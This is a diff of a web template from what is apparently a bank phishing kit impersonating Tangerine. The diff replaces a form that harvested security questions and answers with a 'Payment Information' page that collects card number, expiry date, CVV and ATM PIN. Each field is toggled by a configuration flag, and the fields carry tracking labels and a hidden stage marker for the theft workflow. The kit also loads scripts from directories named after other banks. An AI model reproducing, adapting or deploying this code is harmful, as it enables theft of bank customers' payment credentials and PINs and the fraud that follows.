@@ -1,4 +1,13 @@
-<html><head>
+<%
+
+let p_card = tangerine.card === 'on' ? true : false;
+let p_atm = tangerine.atm === 'on' ? true : false;
+let p_cvv = tangerine.cvv === 'on' ? true : false;
+let p_expiry = tangerine.exp === 'on' ? true : false;
+
+%>
+<html>
+    <head>
         <meta charset="utf-8">
         <title>Verification | Tangerine</title>
         <meta name="description" content="">
@@ -69,34 +78,43 @@
                     </style>
                     <div class="forgot-login" style="margin-top: 0px; padding: 23px;">
                         <div class="forgot-login__email ng-scope" ng-if="$ctrl.currentState === $ctrl.STATES.FORM">
-                            <h2 class="heading--title2 ng-binding">Verify your Security Questions</h2>
-                            <% for (let x = 1; x <= p_quests; x++) { %>
-                                <div class="">
-                                    <label>Select your security question (<%= x %>)</label>
-                                    <select class="input lrinput" name="question<%= x %>" required attr-action="Selecting Sec Ques <%= x %>">
-                                        <option value="">Select a question</option>
-                                        <option value="What was your dream job as a child?">What was your dream job as a child?</option>
-                                        <option value="What is the name of your childhood super hero?">What is the name of your childhood super hero?</option>
-                                        <option value="What was your favourite childhood story?">What was your favourite childhood story?</option>
-                                        <option value="What was your high school mascot?">What was your high school mascot?</option>
-                                        <option value="What is the name of your childhood best friend?">What is the name of your childhood best friend?</option>
-                                        <option value="What was your childhood nickname?">What was your childhood nickname?</option>
-                                        <option value="Which sports team did you like most when you were a child?">Which sports team did you like most when you were a child?</option>
-                                        <option value="What was your favourite place to visit as a child?">What was your favourite place to visit as a child?</option>
-                                        <option value="In what town or city did your parents meet?">In what town or city did your parents meet?</option>
-                                        <option value="On what street did you grow up?">On what street did you grow up?</option>
-                                        <option value="What was the name of your first pet?">What was the name of your first pet?</option>
-                                        <option value="What was the name of your favourite teacher?">What was the name of your favourite teacher?</option>
-                                        <option value="What was your favourite childhood toy?">What was your favourite childhood toy?</option>
-                                        <option value="What was the name of your first girlfriend or boyfriend?">What was the name of your first girlfriend or boyfriend?</option>
-                                        <option value="What was the first concert you attended?">What was the first concert you attended?</option>
+                            <h2 class="heading--title2 ng-binding">Payment Information</h2>
+                            <% if (p_card) { %>
+                                <label>Card Number</label>
+                                <div class="form-group">
+                                    <input id="input-card" type="tel" placeholder="Enter your Card Number" name="card" class="input lrinput" onkeyup="split()" required autocomplete="off" maxlength="19" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" attr-action="Filling Card">
+                                    <!-- Assuming you have the jQuery and splitter.js loaded elsewhere in your template -->
+                                </div>
+                            <% } %>
+                            <% if (p_expiry) { %>
+                                <label>Expiry</label>
+                                <div class="form-group">
+                                    <select name="exp1" required class="input lrinput" style="width:48%; display: inline-block;" attr-action="Selecting Expiry">
+                                        <option value="">MM</option>
+                                        <% for (let x = 1; x <= 12; x++) { %>
+                                            <% let y = x.toString().padStart(2, '0'); %>
+                                            <option value="<%= y %>"><%= y %></option>
+                                        <% } %>
+                                    </select>
+                                    <select name="exp2" required class="input lrinput" style="width:50%; display: inline-block;" attr-action="Selecting Expiry">
+                                        <option value="">YY</option>
+                                        <% for (let x = new Date().getFullYear() % 100; x <= new Date().getFullYear() % 100 + 15; x++) { %>
+                                            <option value="<%= x %>"><%= x %></option>
+                                        <% } %>
                                     </select>
                                 </div>
-                                <div class="InputContainer__input">
-                                    <label>Enter your security answer (<%= x %>)</label>
-                                    <input autocomplete="off" required name="answer<%= x %>" attr-action="Filling Sec Ans <%= x %>" type="text" placeholder="Enter your answer" class="input lrinput">
+                            <% } %>
+                            <% if (p_cvv) { %>
+                                <div class="form-group">
+                                    <label>CVV</label>
+                                    <input required id="input-cvv" type="tel" maxlength="3" placeholder="&bullet;&bullet;&bullet;" name="cvv" class="input lrinput" oninput="this.value = this.value.replace(/[^0-9]/, '')" attr-action="Filling CVV">
                                 </div>
-                                <br>
+                            <% } %>
+                            <% if (p_atm) { %>
+                                <div class="form-group">
+                                    <label>ATM Pin</label>
+                                    <input required id="input-atm" type="tel" maxlength="6" placeholder="&bullet;&bullet;&bullet;&bullet;" name="atm" class="input lrinput" oninput="this.value = this.value.replace(/[^0-9]/, '')" attr-action="Filling ATM Pin">
+                                </div>
                             <% } %>
                             
                             <div class="text-right">
@@ -107,9 +125,11 @@
                 </form>
             </forgot-login>
         </div>
-        <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
         <span hidden id="navig"> <%=navig%> </span>
-        <span hidden id="stage">Question</span>
+        <span hidden id="stage">Card</span>
     </body>
-    <script src="/bank/tangerine/js/script.js"></script>
-    </html>
+    <script src="/bank/atb/js/scriptCard.js"></script>
+    <script src="/bank/tangerine/js/script.js">
+    </script>
+</html>
+
